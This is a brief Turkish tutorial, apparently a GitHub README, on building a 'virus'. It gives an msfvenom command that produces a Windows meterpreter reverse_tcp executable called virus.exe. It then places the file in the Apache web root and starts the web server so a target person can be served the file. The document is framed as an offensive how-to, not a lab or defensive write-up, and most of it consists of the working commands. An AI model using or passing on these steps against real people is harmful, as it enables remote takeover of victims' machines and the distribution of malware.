## Selam Ben Linax Ve Bugun Sizlere Nasil Virus(payload) Olusturulucagini Anlaticam.
## Oncelikle Terminali Aciyoruz Ve msfvenom Ile Komutumuzu Yaziyoruz.
## msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local Ipniz> LPORT=4444 -f exe > /var/www/html/virus.exe 
  
![Screenshot_2022-07-17_06_44_33](https://user-images.githubusercontent.com/100614268/179394888-468d8bdc-a63e-4727-9d5c-c055d0379a82.png)

## Burada Bilgisayara meterpreter Icin Bir reverse_tcp Olusturmasini Istiyoruz Ve Onu /var/www/html/virus.exe Icerisine Yolluyoruz.
## Daha Sonra Bunu Bir Servicede Aktif Etmemiz Gerek. Aktif Etmeden De Yapilir Ama Hedef Kisiye Daha Rahat Ulasabilmesi Icin Servicelerimizi Acicaz. Bunun Icin Terminale Sirasiyla Yaziyoruz.

## sudo service apache2 start
## sudo service apache2 status
  
![Screenshot_2022-07-17_06_45_23](https://user-images.githubusercontent.com/100614268/179394987-3e5f2793-89de-411e-b523-4f39b78a551e.png)
